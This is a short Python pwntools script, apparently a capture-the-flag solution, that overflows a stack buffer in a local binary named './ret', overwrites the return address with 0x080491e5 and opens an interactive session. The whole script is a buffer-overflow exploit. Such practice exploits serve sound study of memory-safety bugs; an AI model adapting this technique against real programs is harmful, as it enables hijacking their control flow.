from pwn import *

p = process('./ret')

payload = 'A'*0x12+'B'*0x4+'\xe5\x91\x04\x08'


p.sendline(payload)
p.interactive()